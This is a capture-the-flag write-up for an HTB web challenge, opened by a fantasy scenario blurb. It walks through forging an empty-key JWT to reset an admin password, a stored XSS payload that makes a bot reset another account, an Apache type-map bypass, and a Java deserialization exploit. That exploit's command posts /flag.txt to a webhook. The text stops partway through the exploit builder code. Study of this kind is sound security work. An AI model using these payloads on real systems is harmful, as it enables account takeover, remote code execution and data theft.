
> [!SCENARIO]
> **Sir Garran Voss**, Former Lord Captain of the Ashguard, is a knight shaped by poverty, war, and **Maelor's** cruelty, holding the salt-flat line against **Alyss's** undead, the only one the line still trusts to hold it. He is tired of killing, even the dead who wear faces he remembers. During the standoff the Red Priestess lays a shadow over the oath buried in him, an invocation under her breath, and corrupts it. Now Garran hears Maelor where **Stormbound** should be. He turns on the men beside him, swinging his blade like they're already enemies, and it takes soldiers throwing their weight onto him to hold him down. Lucid for a breath, he begs for someone to end him. **Veylen Marr** enters Garran's mind to change the corrupted oath before the standoff breaks. He walks the memories of his life, changing the oath from serving the dead king to protecting the living realm.

```txt
Target IP: 154.57.164.77:30540  
```

# Recon 

First We need to Look about the target ;  we got an IP and port. let's look through the web  :

![[webss.png]]

We have an Sign In ,Create Account option, Forgot Password options  :

![[loginpage.png]]

 From This I got a mail  : dms@htb.com  . Maybe useful in future .  I started creating an account  ; 
 
 ## Account Creation
 
 Request:

```
POST /api/register HTTP/1.1
Host: 154.57.164.77:30540
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.77:30540/
Content-Type: application/json
Content-Length: 60
Origin: http://154.57.164.77:30540
Connection: keep-alive
Priority: u=0

{"login":"shadow0x@v10let.htb","password":"'LV,v5,)}#k3kng"}
```

Response : 

```
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:21:51 GMT
Server: Apache/2.4.66 (Ubuntu)
Content-Security-Policy: default-src 'self'; sandbox allow-scripts allow-same-origin allow-forms; script-src 'self'; script-src-elem 'self'; script-src-attr 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self'; font-src 'self'; media-src 'self'; connect-src 'self'; frame-src 'none'; child-src 'none'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
Content-Type: application/json; charset=utf-8
Content-Length: 10
Set-Cookie: cs_session=6493a8056e6d225b1804342ec8e4c4cd7f843c0040dafa8850756552a74e163b; Path=/; Max-Age=3600; HttpOnly
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"session":"6493a8056e6d225b1804342ec8e4c4cd7f843c0040dafa8850756552a74e163b","user":"shadow0x@v10let.htb"}
```

Based on the **Signetry source code**, the registration process is handled by the Go backend (`Crownspire`). The frontend collects the user's email and password and sends them to the `/api/register` endpoint.  

## Authentication Analysis

After successfully creating an account, I began reviewing the authentication implementation in the source code, starting with:

```url
crownspire/internal/auth/authenticator.go
```

This file implements the application's authentication logic, including user registration, login, role management, and password reset.

### Default Accounts

The first interesting observation is that the application automatically creates several privileged accounts during initialization.

```go
const (
    MaintainerLogin  = "dms@htb.com"
    WardenLogin      = "warden@htb.com"
    ConservatorLogin = "conservator@htb.com"
)
```

These accounts are seeded when the application starts.

```go
seed := map[string]struct {
    password string
    roles    roleSet
}{
    MaintainerLogin:  {password: randToken(24), roles: roleSet{RoleMaintainer: true}},
    WardenLogin:      {password: wardenPassword(), roles: roleSet{RoleService: true}},
    ConservatorLogin: {password: randToken(24), roles: roleSet{RoleCurator: true}},
}
```

This immediately explains why the login page exposed the email address `dms@htb.com`. It is not just a placeholder—it is the application's pre-created **Maintainer** account.

### User Registration

Next, I reviewed the `Register()` function.

```go
func (a *Authenticator) Register(login, pwd string) error {
    ...
    a.roles[login] = roleSet{RoleViewer: true}
}
```

Every user created through `/api/register` is assigned only the **Viewer** role.

This means that although I could successfully register and authenticate, my account had only basic privileges and could not access maintainer functionality such as attachment uploads or administrative actions.

At this point it became clear that privilege escalation would be required.

### Reviewing the Password Reset Logic

The next function worth investigating was the password reset handler.

```go
func (a *Authenticator) ResetPassword(token, newPassword string) (string, error)
```

The function begins by validating a JWT token.

```go
claims, err := a.qor.ValidateClaims(token)
```

After validation, it extracts the user identifier from the token.

```go
uid := claims.Id
```

Surprisingly, the reset handler only accepts one account.

```go
if uid != MaintainerLogin {
    return "", errors.New("invalid account")
}
```

Since `MaintainerLogin` is defined as:

```go
const MaintainerLogin = "dms@htb.com"
```

the endpoint is explicitly designed to reset only the Maintainer account.

At first glance this appears secure because an attacker should never be able to generate a valid password-reset token.

However, this prompted me to investigate **how `ValidateClaims()` verifies the JWT**, leading to the first vulnerability.

# Empty JWT Signing Key

The `ResetPassword()` function relies on `ValidateClaims()` to verify the supplied JWT before allowing a password reset. To understand how this validation worked, I traced the initialization of the `qor` authentication library.

The authentication service is initialized as follows:

```go
qor := qorauth.New(&qorauth.Config{ DB: gormDB, })
```

One important detail immediately stood out: **no JWT signing secret is configured**.

Normally, JWTs signed using the **HS256** algorithm require a secret key that is known only to the server. During validation, the server recomputes the signature using this secret and compares it against the signature embedded in the token.

In this case, however, the application creates the QOR authentication instance without providing any signing secret. According to the QOR implementation, this causes the library to fall back to its default behaviour of using an **empty HMAC key** for signing and verification.

As a result, an attacker can generate a completely valid JWT simply by signing it with an empty string.

Since the password reset handler only trusts the claims returned by `ValidateClaims()`, forging a valid token allows us to control the value of:

```go
uid := claims.Id
```

The handler subsequently checks:

```go
if uid != MaintainerLogin { return "", errors.New("invalid account") }
```

Because `MaintainerLogin` is defined as `dms@htb.com`, we can forge a JWT containing that account identifier and submit it to the password reset endpoint. The application successfully validates the forged token and proceeds to reset the Maintainer's password.

This gives us full control of the built-in **Maintainer** account, allowing us to continue the attack chain with elevated privileges

### Why the Standard Password Reset Fails (The `/reset` route)

If we examine the frontend application's routing, we can see that the `/reset` path handles two distinct scenarios depending on the presence of a `token` URL parameter:

```js

// crownspire/frontend/src/App.jsx

export default function ResetPassword() {

  const token = new URLSearchParams(window.location.search).get('token') || ''

  return token ? <SetNewPassword token={token} /> : <RequestReset />

}
```

**Without a Token**: Visiting `/reset` directly renders the `<RequestReset />` component, prompting the user for an email address to send a recovery link. This submits a request to the backend `/auth/password/recover` endpoint. However, a review of the Go source code reveals this endpoint is intentionally broken:

```go
func (h _Handler) Recover(c_ gin.Context) {

       c.JSON(http.StatusServiceUnavailable, gin.H{

           "error": "Password-reset email delivery is temporarily under maintenance. Please try again later or contact your platform administrator.",

       })

   }
```

Because it returns a `503 Service Unavailable`, we cannot legitimately request a password reset token.

**With a Token**: If the URL contains a token (e.g., `/reset?token=...`), the frontend renders the `<SetNewPassword />` component. This allows the user to input a new password and submits it to the backend `/auth/password/update` endpoint.

Because the legitimate recovery route is disabled, we must forge the token ourselves and supply it to the update endpoint (either via the UI at `/reset?token=...` or directly via the API) to successfully change the password.


# Exploiting the Password Reset Vulnerability

After identifying that the JWT signing secret was left empty, the next step was to forge a valid password reset token for the built-in Maintainer account.

From the previous code review, the password reset handler only accepts the account whose identifier matches:

```go
const MaintainerLogin = "dms@htb.com"
```

Therefore, the forged JWT must contain the following claim:

```go
{
    "jti": "dms@htb.com"
}
```

Since the application validates JWTs using an empty HMAC signing key, this token can be generated locally without knowing any server-side secret.

The resulting HS256 token is:

```hash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJkbXNAaHRiLmNvbSJ9.tUUYI_xBWaeAFAlVB8q7SjWKTZbTH9dai2dlYh0W9fU
```

To use our forged token, we need to know exactly where to send it. By examining the Go backend's route definitions in `crownspire/internal/handler/handler.go`, we find the endpoint that triggers the `ResetPassword` function:

```go

func (h *Handler) Routes(r *gin.Engine) {

    // ...

    r.POST("/auth/password/recover", h.Recover)

    r.POST("/auth/password/update", h.ResetPassword)

    // ...

}

```

Additionally, looking at the frontend API client (`crownspire/frontend/src/api/client.js`), we can confirm how the frontend structures the request when submitting the "Set New Password" form:

```go

export async function resetPassword(token, newPassword) {

  const res = await fetch('/auth/password/update', {

    method: 'POST',

    headers: { 'Content-Type': 'application/json' },

    body: JSON.stringify({ reset_password_token: token, new_password: newPassword }),

  })

  return { status: res.status, body: await j(res) }

}

```

This tells us that we need to send a `POST` request to `/auth/password/update` with a JSON body containing `reset_password_token` and `new_password`.

We can use our forged token to manually craft this request, resetting the maintainer's password and then logging in:

```bash
┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ curl -sS -X POST "http://154.57.164.73:30699/auth/password/update" \
  -H "Content-Type: application/json" \
  --data '{
    "reset_password_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJkbXNAaHRiLmNvbSJ9.tUUYI_xBWaeAFAlVB8q7SjWKTZbTH9dai2dlYh0W9fU",                    
    "new_password":"T3t496W<q+$P"
  }'

```

Output :

```bash
{"status":"password updated","user":"dms@htb.com"} 
```

So we successfully rested the password . now lets try to login as dms@htb.com  


### The Maintainer's Privileges

Now that we are logged in as the Maintainer (`dms@htb.com`), our account holds the `RoleMaintainer` role. Looking at `crownspire/internal/auth/identity.go`, we can see the permissions associated with this role:

```go

RoleMaintainer: {

    PermissionRead:     true,
    PermissionMaintain: true,

},

```

The `PermissionMaintain` permission is checked in the backend middleware `RequireMaintainer()` (in `middleware.go`). It unlocks several critical API endpoints that were previously inaccessible to our Viewer account:

```go

writes := r.Group("/", h.authn.RequireMaintainer())
writes.POST("/stage", h.Stage)
writes.POST("/seal", h.Seal)
writes.POST("/withdraw", h.Withdraw)
writes.POST("/api/appeals", h.SubmitAppeal)
writes.POST("/api/attachments", h.Upload)

```

The most interesting endpoints here are `/api/appeals` and `/api/attachments`, as they allow us to submit content to the server. Because we have these permissions, the frontend UI also changes. We can now see a new section: **Appeal a Review**.

![[appeal.png]]

Request And Response :

```
POST /api/appeals HTTP/1.1
Host: 154.57.164.73:30699
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.73:30699/
Content-Type: application/json
Content-Length: 15
Origin: http://154.57.164.73:30699
Connection: keep-alive
Cookie: cs_session=4a75650918ae0c446f8f76adb5992b64852bd912662acbdd84f5ff0b1a14eae3
Priority: u=0

{"body":"test"}
```


```
HTTP/1.1 200 OK
Date: Wed, 29 Jul 2026 05:33:47 GMT
Server: Apache/2.4.66 (Ubuntu)
Content-Security-Policy: default-src 'self'; sandbox allow-scripts allow-same-origin allow-forms; script-src 'self'; script-src-elem 'self'; script-src-attr 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self'; font-src 'self'; media-src 'self'; connect-src 'self'; frame-src 'none'; child-src 'none'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
Content-Type: application/json; charset=utf-8
Content-Length: 57
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"id":"770ba5003799755b","status":"submitted for review"}
```

When an appeal is submitted, it gets saved in the system. But who actually reviews these appeals?

In `handler.go`, we find another endpoint designed to list the appeals:

```go

review := r.Group("/", h.authn.RequireAppealReview())
review.GET("/api/appeals", h.ListAppeals)

```

This route is restricted to users with `PermissionReviewAppeals`. According to `identity.go`, only two roles have this permission: `RoleCurator` and `RoleService`.

As we'll see next, there is a background bot (the Warden bot) acting as a service account that reviews these appeals. This sets the stage for a Stored Cross-Site Scripting (XSS) attack! .

# Stored XSS and Curator Takeover

To execute our XSS payload, we need the Warden bot to view our appeal. Let's look at how the Warden bot (`crownspire/cmd/wardenbot/main.go`) and the frontend parsing work.
## 1. Triggering the Warden Bot (Apache Type-Map Bypass)

The Warden bot is a headless browser that polls an internal queue for URLs to visit:

```go

paths := fetchQueue(base, queueToken) // Hits /internal/queue

for _, p := range paths {

    sid := wardenSession(base, login, password)

    visit(allocCtx, base+p, allowedOrigin, sid, dwell)

}
```

Paths are added to this queue via the `/internal/dispatch` endpoint in `handler.go`:

```go

func (h *Handler) Dispatch(c *gin.Context) {

    // ...

    h.queue = append(h.queue, "/admin")
    c.JSON(http.StatusOK, gin.H{"status": "queued for review"})

}
```

However, we cannot simply request `/internal/dispatch` directly because the Apache reverse proxy blocks it via `apache/signetry.conf`:

```conf

RewriteEngine On
RewriteCond %{IS_SUBREQ} =false
RewriteCond %{ENV:REDIRECT_STATUS} =""
RewriteRule ^/internal(/|$) - [F]
```

Notice the condition `RewriteCond %{IS_SUBREQ} =false`. This means the block is **only** applied if the request is not an internal subrequest. Because we have Maintainer privileges, we can upload files to the `/uploads` directory using `/api/attachments`. Apache is configured to serve this directory with `AddHandler type-map .var`.

By uploading a `.var` type-map file containing `URI: ../internal/dispatch`, we can force Apache to make an internal subrequest to our target, bypassing the rewrite rule and queuing the Warden bot to visit `/admin`!

## 2. Bypassing the XSS Filter

When the Warden bot visits `/admin`, it loads the appeals we submitted. Looking at the frontend code (`crownspire/frontend/src/pages/MemoryBank.jsx`), the appeal body is parsed as HTML using `html-react-parser`:

```js

const BLOCKED_APPEAL_ELEMENTS = new Set(['iframe', 'frame', 'frameset', 'object', 'embed', 'meta', 'base', 'link', 'script'])

const APPEAL_PARSE_OPTIONS = {

  replace(node) {

    if (BLOCKED_APPEAL_ELEMENTS.has(node.name)) return <></>

  },

}

```

This is a weak blacklist filter. Because it blocks `<script>` and `<iframe>` but allows `<img>`, we can easily bypass it by submitting an image tag with an `onerror` event handler to execute arbitrary JavaScript: `<img src="x" onerror="...XSS PAYLOAD...">`

## 3. Escalating to Curator

The Warden bot logs in using `warden@htb.com`, which has the `RoleService` role. What can this role do? According to `identity.go`:

```go

RoleService: {

    PermissionRead:          true,

    PermissionReviewAppeals: true,

    PermissionReissueCreds:  true,

},
```

Crucially, it has `PermissionReissueCreds`. This allows the bot to access the `/admin/credential/reset` endpoint to reset the password of any user. We want to escalate to the Curator account (`conservator@htb.com`), so our XSS payload must force the bot to make this password reset request!

## Executing the Takeover

Lets first save the cookie of Maintainer account  :

```bash
┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ curl -sS -c dms.cookies \
  -X POST "http://154.57.164.73:30699/api/login" \
  -H "Content-Type: application/json" \
  --data '{
    "login":"dms@htb.com",
    "password":"T3t496W<q+$P"
  }' 
```

Output:

```bash
{"session":"9d9e404c670e79aceb41027223567b18e689bb2cfefea22a9e9fe203c318e20e","user":"dms@htb.com"} 
```

we got the Maintainer account cookie now . Now that we have the Maintainer account cookie saved in `dms.cookies`, we can execute the sequence of API requests to hijack the Curator account.

### **Submitting the XSS Payload:**

First, we send a `POST` request to `/api/appeals`. Our payload `{"body":"<img is=\"x-img\" src=\"x\" onerror=\"...\">"}` bypasses the blacklist filter. When the Warden bot evaluates this, the `onerror` event triggers a `fetch()` request _from the bot's perspective_. It hits the `/admin/credential/reset` endpoint and forcefully changes the password of the `conservator@htb.com` account to `8ss7@[9v/eX`.

```bash
┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ curl -sS -b dms.cookies \
  -X POST "http://154.57.164.73:30699/api/appeals" \
  -H "Content-Type: application/json" \
  --data '{
    "body":"<img is=\"x-img\" src=\"x\" onerror=\"fetch('\''/admin/credential/reset'\'',{method:'\''POST'\'',headers:{'\''Content-Type'\'':'\''application/json'\''},body:JSON.stringify({uid:'\''conservator@htb.com'\'',new_password:'\''8ss7@[9v/eX'\''})})\">"
  }'
```

output:

```bash
{"id":"bb6c4f209e24c7bf","status":"submitted for review"} 
```

### **Preparing the Type-Map File:**

Next, we create a local file named `test.var`. Why a type-map file? As mentioned earlier, we cannot hit `/internal/dispatch` directly because Apache blocks it. However, the `/uploads` directory has `AddHandler type-map .var` enabled. A type-map file allows us to define alternative representations for a resource using the `URI:` directive. When Apache processes this file, it makes an _internal subrequest_ to fetch the specified URI. Because the firewall rule specifically ignores subrequests (`RewriteCond %{IS_SUBREQ} =false`), this perfectly bypasses the restriction, allowing us to hit the internal endpoint!

```bash
┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ printf 'URI: ../internal/dispatch\nContent-Type: application/json\n\n' > test.var
```

```bash
┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ cat test.var 
URI: ../internal/dispatch
Content-Type: application/json
```

### **Uploading the Type-Map File:**

Because we have the `RoleMaintainer` role, we can upload `test.var` to the server via `/api/attachments`. The server responds by saving it to `/uploads/test.var`.

```bash
┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ curl -sS -b dms.cookies \
  -X POST "http://154.57.164.73:30699/api/attachments?name=test.var" \
  --data-binary @test.var
```

Output:

```bash
{"path":"/uploads/test.var"} 
```

### **Triggering the Subrequest:**

We use `curl` to fetch our uploaded file from Apache at `/uploads/test.var`. This triggers Apache's `mod_negotiation`, firing the internal subrequest to `/internal/dispatch`, which successfully adds the `/admin` page to the Warden bot's queue.

```bash
┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ curl -sS "http://154.57.164.73:30699/uploads/test.var"
```

Output:

```bash
{"status":"queued for review"} 
```

Once the bot visits `/admin`, our XSS executes and the Curator's password is changed! . Wait for 10 seconds then we can login . 
# Conservator

> [!NOTE]
> **Curator vs. Conservator**
> If you are reading the source code, you might notice that the developers used two different terms for this account. The account's login email is defined as `conservator@htb.com` (`ConservatorLogin`), but the privilege level it is granted is called `RoleCurator`. In this writeup, these terms are used interchangeably and refer to the exact same administrative account.

Now we can log in as the Conservator:

```bash
┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ curl -sS -c conservator.cookies \
  -X POST "http://154.57.164.73:30699/api/login" \
  -H "Content-Type: application/json" \
  --data '{
    "login":"conservator@htb.com",
    "password":"8ss7@[9v/eX"
  }' 
```

Output:

```bash
{"session":"7eeb09baeb1e5c44d841a3e879d8209dfd87a1d6fb9c463df99abac45784b306","user":"conservator@htb.com"} 
```

now we are conservator . lets use web to look what we have :

![[Review Queue.png]]

i can see  Review Queue .  we can see both of our review requits that we done with maintanor account . the pyload and the test .

Because we are now logged in as the Curator (`conservator@htb.com`), our UI displays the **Review Queue**. This is because the Curator role possesses `PermissionReviewAppeals`, allowing them to see all submitted appeals—including the ones we injected with our XSS payload from the Maintainer account.

More importantly, the Curator role also holds `PermissionReviewModels`. This is the exact permission required to hit the `/finalize` API endpoint.

## Why do we need the Curator account?

If we look at `crownspire/internal/handler/handler.go`, we can see the `/finalize` endpoint is restricted to users with the `RequireModelFinalize` middleware:

```go

finalization := r.Group("/", h.authn.RequireModelFinalize())

finalization.POST("/finalize", h.Finalize)

```

The `/finalize` endpoint is the bridge between the Go frontend gateway and the internal Java backend (`Signetry`). When a model is finalized, the Go application sends the ZIP file to the Java service for storage and processing.

Now that we have the power to finalize models, we need to understand what happens to them once they reach the Java backend. This leads us to the Remote Code Execution vulnerability!

# The Java Deserialization Vulnerability (DL4J)

When our Curator account hits the `/finalize` API on the Go frontend, the frontend sends the staged model (a `.zip` file) to the internal Java backend application.

This model is handled by the `CertifierService.java` class in the backend. Let's break down exactly what happens and why it is vulnerable.
## 1. The Validation Step (Safe)

First, the `accept()` method receives our uploaded ZIP file:

```java

public String accept(byte[] model) throws IOException {

Path tmp = Files.createTempFile(config.pending(), "intake-", ".zip");

Files.write(tmp, model);

ValidationResult vr = DL4JModelValidator.validateMultiLayerNetwork(tmp.toFile());

if (vr == null || !vr.isValid()) {

Files.deleteIfExists(tmp);

return null;

}

// ... adds the model to a processing queue ...

}

```

The server uses `DL4JModelValidator.validateMultiLayerNetwork()` to check if the file is a valid Deeplearning4j (DL4J) model. This validation is mostly safe—it simply looks inside the ZIP archive to ensure required files (like `configuration.json` and `coefficients.bin`) exist. If our ZIP passes this basic check, it is added to a processing queue.

### 2. The Deserialization Step (Vulnerable)

A background thread continuously pulls models from this queue and processes them in the `run()` method:

```java

private void run() {

while (true) {

Path model = queue.take(); // Pulls our model from the queue

try {

MultiLayerNetwork net = ModelSerializer.restoreMultiLayerNetwork(model.toFile(), false);

System.out.println("[certifier] previewed model params=" + net.numParams());

} // ... catches errors and deletes file

}

}

```

Here is where the fatal flaw occurs: `ModelSerializer.restoreMultiLayerNetwork()`.

**What is Java Deserialization?**

When Java programs need to save objects (like a Neural Network configuration) to a file, they "serialize" them into a binary data format. To load them back into memory later, they "deserialize" them using a function called `ObjectInputStream.readObject()`.

However, if a program uses `readObject()` on untrusted data provided by a user, it is highly dangerous! An attacker can craft a malicious binary object that tricks the Java runtime into executing system commands during the loading process. This is known as Insecure Deserialization, and it leads to complete Remote Code Execution (RCE).

**The DL4J Exploit:**

Deeplearning4j saves its models as `.zip` files containing several components. One of those components is a file named `updaterState.bin`.

When `ModelSerializer.restoreMultiLayerNetwork()` is called, the library unzips the file and eventually calls `ObjectInputStream.readObject()` directly on `updaterState.bin` to restore the neural network's state. It blindly trusts the contents of the file!

Because we can upload whatever ZIP file we want, we can use a tool like `ysoserial` to generate a malicious serialized Java object. If we name this malicious payload `updaterState.bin`, package it into a ZIP file along with a dummy `configuration.json` and `coefficients.bin` (just to pass the validation step), and upload it to the server... boom!

When the background thread attempts to restore the network, it will deserialize our payload and execute our arbitrary code on the internal Java server!

Now that we understand exactly *how* the vulnerability works, let's build the malicious ZIP file!.

##  Building the Malicious Model (`model.zip`)

Our goal is to build a valid DL4J `model.zip` that contains our malicious serialized payload (`preprocessor.bin`). When this file is parsed by the backend, it will trigger the RCE and send the flag to our webhook.

### Prerequisites

- Java 11 JDK
- Maven 3.6+
  
Let's verify our environment:

```bash
┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ java -version; mvn -version
openjdk version "11.0.31" 2026-04-21
OpenJDK Runtime Environment (build 11.0.31+11-post-1-Debian)
OpenJDK 64-Bit Server VM (build 11.0.31+11-post-1-Debian, mixed mode, sharing)
Apache Maven 3.9.12
Maven home: /usr/share/maven
Java version: 11.0.31, vendor: Debian, runtime: /usr/lib/jvm/java-11-openjdk-amd64
Default locale: en_US, platform encoding: UTF-8
OS name: "linux", version: "7.0.12+kali-amd64", arch: "amd64", family: "unix"

```

It's perfect! .

### Step 1 — Create the project structure

```bash

┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ mkdir -p ~/signetry-exploit/src/main/java

┌──(shadow0x㉿cypher)-[~/CTF/HTB/CyberAPo/Signetry]
└─$ cd ~/signetry-exploit

```

### Step 2 — Create `pom.xml`

```bash

cat > pom.xml << 'POMEOF'

<project xmlns="http://maven.apache.org/POM/4.0.0"

         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0

                             http://maven.apache.org/xsd/maven-4.0.0.xsd">

  <modelVersion>4.0.0</modelVersion>

  <groupId>htb</groupId>

  <artifactId>signetry-exploit</artifactId>

  <version>1.0</version>

  

  <properties>

    <dl4j.version>1.0.0-M2.1</dl4j.version>

  </properties>

  

  <dependencies>

    <dependency>

      <groupId>org.deeplearning4j</groupId>

      <artifactId>deeplearning4j-core</artifactId>

      <version>${dl4j.version}</version>

    </dependency>

    <dependency>

      <groupId>org.nd4j</groupId>

      <artifactId>nd4j-native-platform</artifactId>

      <version>${dl4j.version}</version>

    </dependency>

    <dependency>

      <groupId>org.javassist</groupId>

      <artifactId>javassist</artifactId>

      <version>3.30.2-GA</version>

    </dependency>

  </dependencies>

  

  <build>

    <plugins>

      <plugin>

        <groupId>org.apache.maven.plugins</groupId>

        <artifactId>maven-compiler-plugin</artifactId>

        <version>3.8.1</version>

        <configuration>

          <source>11</source>

          <target>11</target>

          <compilerArgs>

            <arg>--add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED</arg>

            <arg>--add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED</arg>

            <arg>--add-exports=java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED</arg>

            <arg>--add-exports=java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED</arg>

          </compilerArgs>

        </configuration>

      </plugin>

      <plugin>

        <groupId>org.codehaus.mojo</groupId>

        <artifactId>exec-maven-plugin</artifactId>

        <version>3.1.1</version>

        <configuration>

          <mainClass>BuildExploit</mainClass>

        </configuration>

      </plugin>

    </plugins>

  </build>

</project>

POMEOF
```

**Understanding the `pom.xml`:**

Because Java Deserialization exploits rely heavily on deep internal mechanics of the Java Runtime Environment (JRE), we must instruct the compiler to grant us access to hidden packages.

- **Dependencies:** We import the vulnerable `deeplearning4j-core` and `nd4j-native-platform` libraries so that we can construct a valid neural network model. We also import `javassist`, a powerful bytecode manipulation library that we will use to dynamically generate our malicious Java classes on the fly.

- **Compiler Flags:** Starting in Java 9, internal classes (like `com.sun.*`) were locked down by the module system. Because our exploit relies on manipulating `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` (a classic deserialization gadget), we use the `--add-exports` flags to forcefully expose these internal packages during compilation.

### Step 3 — Create `src/main/java/BuildExploit.java`

Create the Java source file:

```bash
┌──(shadow0x㉿cypher)-[~/signetry-exploit]
└─$ nano src/main/java/BuildExploit.java
```

Paste the following code into it. This code dynamically builds the `EvilTranslet` bytecode payload, wraps it in the `BadAttributeValueExpException` gadget chain, and injects it into a valid DL4J zip file as `preprocessor.bin`.

```java

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javassist.*;

import org.deeplearning4j.nn.conf.MultiLayerConfiguration;

import org.deeplearning4j.nn.conf.NeuralNetConfiguration;

import org.deeplearning4j.nn.conf.layers.OutputLayer;

import org.deeplearning4j.nn.multilayer.MultiLayerNetwork;

import org.deeplearning4j.util.ModelSerializer;

import org.nd4j.linalg.activations.Activation;

import org.nd4j.linalg.lossfunctions.LossFunctions;

  

import javax.management.BadAttributeValueExpException;

import java.io.*;

import java.lang.reflect.Field;

import java.util.zip.*;

  

public class BuildExploit {

  

    static void setField(Object obj, String name, Object value) throws Exception {

        Class<?> c = obj.getClass();

        while (c != null) {

            try {

                Field f = c.getDeclaredField(name);

                f.setAccessible(true);

                f.set(obj, value);

                return;

            } catch (NoSuchFieldException e) { c = c.getSuperclass(); }

        }

        throw new NoSuchFieldException(name);

    }

  

    static byte[] buildTransletBytecode(String cmd) throws Exception {

        ClassPool pool = ClassPool.getDefault();

        pool.insertClassPath(new ClassClassPath(

                Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet")));

  

        CtClass cc = pool.makeClass("EvilTranslet");

        cc.setSuperclass(pool.get(

                "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

  

        CtConstructor ctor = new CtConstructor(new CtClass[]{}, cc);

        ctor.setBody(

            "{ Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\""

            + cmd.replace("\"", "\\\"") + "\"}); }");

        cc.addConstructor(ctor);

  

        cc.addMethod(CtNewMethod.make(

            "public void transform(" +

            "com.sun.org.apache.xml.internal.dtm.DTM d," +

            "com.sun.org.apache.xml.internal.serializer.SerializationHandler h)" +

            " throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", cc));

        cc.addMethod(CtNewMethod.make(

            "public void transform(" +

            "com.sun.org.apache.xml.internal.dtm.DTM d," +

            "com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h)" +

            " throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", cc));

  

        return cc.toBytecode();

    }

  

    static TemplatesImpl buildTemplates(byte[] translet) throws Exception {

        TemplatesImpl t = (TemplatesImpl)

                Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")

                     .getDeclaredConstructor().newInstance();

        setField(t, "_bytecodes", new byte[][]{translet});

        setField(t, "_name",      "pwn");

        setField(t, "_class",     null);

        return t;

    }

  

    static void patchBaseJsonNode() throws Exception {

        ClassPool pool = ClassPool.getDefault();

        CtClass base = pool.get("org.nd4j.shade.jackson.databind.node.BaseJsonNode");

        try {

            CtMethod wr = base.getDeclaredMethod("writeReplace");

            base.removeMethod(wr);

            base.toClass(Thread.currentThread().getContextClassLoader(),

                         BuildExploit.class.getProtectionDomain());

            System.out.println("[+]    writeReplace() removed");

        } catch (NotFoundException e) {

            System.out.println("[!]    writeReplace() not present – OK");

        }

    }

  

    static BadAttributeValueExpException buildPayload(TemplatesImpl templates) throws Exception {

        Class<?> pojoClass = Class.forName(

                "org.nd4j.shade.jackson.databind.node.POJONode");

        Object pojo = pojoClass.getConstructor(Object.class).newInstance(templates);

  

        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);

        setField(ex, "val", pojo);

        return ex;

    }

  

    static void appendToZip(File src, File dst, String entryName, byte[] data)

            throws Exception {

        byte[] buf = new byte[8192];

        try (ZipInputStream  zin  = new ZipInputStream(new FileInputStream(src));

             ZipOutputStream zout = new ZipOutputStream(new FileOutputStream(dst))) {

            ZipEntry entry;

            while ((entry = zin.getNextEntry()) != null) {

                zout.putNextEntry(new ZipEntry(entry.getName()));

                int n;

                while ((n = zin.read(buf)) != -1) zout.write(buf, 0, n);

                zout.closeEntry();

            }

            zout.putNextEntry(new ZipEntry(entryName));

            zout.write(data);

            zout.closeEntry();

        }

    }

  

    public static void main(String[] args) throws Exception {

        if (args.length < 1) {

            System.err.println("Usage: mvn exec:java -Dexec.args=\"https://webhook.site/TOKEN\"");

            System.exit(1);

        }

        String webhook = args[0];

        String cmd = "wget -qO- --post-file=/flag.txt " + webhook;

  

        File baseZip  = new File("model_base.zip");

        File finalZip = new File("model.zip");

  

        System.out.println("[*] 1  Compiling EvilTranslet bytecode...");

        byte[] translet = buildTransletBytecode(cmd);

        System.out.printf("[+]    %,d bytes%n", translet.length);

  

        System.out.println("[*] 2  Building TemplatesImpl...");

        TemplatesImpl templates = buildTemplates(translet);

  

